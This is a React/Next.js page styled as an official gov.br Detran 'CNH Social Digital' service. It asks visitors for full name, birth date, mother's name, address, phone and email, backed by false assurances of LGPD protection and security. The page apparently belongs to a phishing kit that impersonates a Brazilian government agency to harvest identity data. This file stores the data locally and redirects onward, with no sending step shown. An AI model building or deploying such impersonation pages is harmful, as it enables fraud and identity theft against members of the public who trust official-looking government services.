"use client"

import type React from "react"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Menu, Search, Mic, User, ChevronRight, Calendar, MapPin, Phone, Mail } from "lucide-react"
import Link from "next/link"

export default function VerificacaoDadosPage() {
  const [isAuthorized, setIsAuthorized] = useState(false)
  const [formData, setFormData] = useState({
    nomeCompleto: "",
    dataNascimento: "",
    nomeMae: "",
    endereco: "",
    telefone: "",
    email: "",
  })
  const router = useRouter()

  useEffect(() => {
    // Verificar se o usuário está logado
    const userLogged = sessionStorage.getItem("user-logged")
    if (!userLogged) {
      router.push("/login")
      return
    }
    setIsAuthorized(true)
  }, [router])

  const handleInputChange = (field: string, value: string) => {
    setFormData((prev) => ({
      ...prev,
      [field]: value,
    }))
  }

  const formatDate = (value: string) => {
    const numbers = value.replace(/\D/g, "")
    return numbers.replace(/(\d{2})(\d{2})(\d{4})/, "$1/$2/$3")
  }

  const formatPhone = (value: string) => {
    const numbers = value.replace(/\D/g, "")
    return numbers.replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3")
  }

  const handleDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatDate(e.target.value)
    if (formatted.length <= 10) {
      handleInputChange("dataNascimento", formatted)
    }
  }

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatPhone(e.target.value)
    if (formatted.length <= 15) {
      handleInputChange("telefone", formatted)
    }
  }

  const handleSubmit = () => {
    // Validar se todos os campos estão preenchidos
    const requiredFields = Object.values(formData)
    if (requiredFields.some((field) => !field.trim())) {
      alert("Por favor, preencha todos os campos obrigatórios")
      return
    }

    // Salvar dados no sessionStorage
    sessionStorage.setItem("user-data", JSON.stringify(formData))

    // Redirecionar para verificação
    router.push("/verificacao")
  }

  if (!isAuthorized) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-center">
          <p className="text-gray-600">Carregando...</p>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header gov.br logado */}
      <div className="bg-white border-b">
        <div className="max-w-md mx-auto px-4 py-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center">
              <img src="/images/govbr-logo.png" alt="gov.br" className="h-8" />
            </div>
            <div className="flex items-center gap-2">
              <Button variant="ghost" size="icon">
                <Menu className="w-5 h-5" />
              </Button>
              <img src="/images/header-icons.png" alt="Ícones do cabeçalho" className="h-6" />
              <Button className="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded-full">
                <User className="w-4 h-4 mr-2" />
                Arthur
              </Button>
            </div>
          </div>
        </div>
      </div>

      {/* Header do Departamento */}
      <div className="bg-white border-b">
        <div className="max-w-md mx-auto px-4 py-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center">
              <Button variant="ghost" size="icon" className="mr-2">
                <Menu className="w-5 h-5 text-blue-600" />
              </Button>
              <h1 className="text-lg font-semibold text-gray-800">Departamento Estadual de Trânsito</h1>
            </div>
            <div className="flex items-center gap-2">
              <Button variant="ghost" size="icon">
                <Mic className="w-5 h-5 text-blue-600" />
              </Button>
              <Button variant="ghost" size="icon">
                <Search className="w-5 h-5 text-blue-600" />
              </Button>
            </div>
          </div>
        </div>
      </div>

      {/* Breadcrumb */}
      <div className="max-w-md mx-auto px-4 py-3">
        <div className="flex items-center text-sm text-blue-600">
          <Link href="/" className="hover:underline">
            Início
          </Link>
          <ChevronRight className="w-4 h-4 mx-1" />
          <Link href="/servicos" className="hover:underline">
            Serviços
          </Link>
          <ChevronRight className="w-4 h-4 mx-1" />
          <Link href="/cnh" className="hover:underline">
            CNH
          </Link>
          <ChevronRight className="w-4 h-4 mx-1" />
          <span className="text-gray-600">CNH Social Digital</span>
        </div>
      </div>

      {/* Conteúdo principal */}
      <div className="max-w-md mx-auto px-4 pb-8">
        <h1 className="text-3xl font-bold text-blue-900 mb-8">Verificação de Dados</h1>

        <p className="text-gray-700 mb-8 leading-relaxed">
          Para prosseguir com sua solicitação, precisamos verificar algumas informações pessoais. Todos os dados serão
          tratados com total segurança e confidencialidade.
        </p>

        <div className="space-y-6">
          {/* Nome Completo */}
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">Nome Completo *</label>
            <Input
              type="text"
              value={formData.nomeCompleto}
              onChange={(e) => handleInputChange("nomeCompleto", e.target.value)}
              placeholder="Digite seu nome completo"
              className="py-3"
            />
          </div>

          {/* Data de Nascimento */}
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">Data de Nascimento *</label>
            <div className="relative">
              <Calendar className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
              <Input
                type="text"
                value={formData.dataNascimento}
                onChange={handleDateChange}
                placeholder="DD/MM/AAAA"
                className="pl-10 py-3"
                maxLength={10}
              />
            </div>
          </div>

          {/* Nome da Mãe */}
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">Nome da Mãe *</label>
            <Input
              type="text"
              value={formData.nomeMae}
              onChange={(e) => handleInputChange("nomeMae", e.target.value)}
              placeholder="Digite o nome completo da sua mãe"
              className="py-3"
            />
          </div>

          {/* Endereço */}
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">Endereço Completo *</label>
            <div className="relative">
              <MapPin className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
              <Input
                type="text"
                value={formData.endereco}
                onChange={(e) => handleInputChange("endereco", e.target.value)}
                placeholder="Rua, número, bairro, cidade, estado"
                className="pl-10 py-3"
              />
            </div>
          </div>

          {/* Telefone */}
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">Telefone *</label>
            <div className="relative">
              <Phone className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
              <Input
                type="text"
                value={formData.telefone}
                onChange={handlePhoneChange}
                placeholder="(11) 99999-9999"
                className="pl-10 py-3"
                maxLength={15}
              />
            </div>
          </div>

          {/* Email */}
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">E-mail *</label>
            <div className="relative">
              <Mail className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
              <Input
                type="email"
                value={formData.email}
                onChange={(e) => handleInputChange("email", e.target.value)}
                placeholder="seu@email.com"
                className="pl-10 py-3"
              />
            </div>
          </div>
        </div>

        {/* Aviso de segurança */}
        <div className="bg-blue-50 p-4 rounded-lg mt-8 mb-8">
          <p className="text-sm text-blue-700">
            <strong>Segurança:</strong> Seus dados pessoais são protegidos pela Lei Geral de Proteção de Dados (LGPD) e
            serão utilizados exclusivamente para o processamento da sua solicitação de CNH Social Digital.
          </p>
        </div>

        {/* Botão continuar */}
        <Button
          onClick={handleSubmit}
          className="w-full bg-blue-600 hover:bg-blue-700 text-white py-4 rounded-full text-lg font-semibold"
        >
          Continuar Verificação
        </Button>
      </div>
    </div>
  )
}
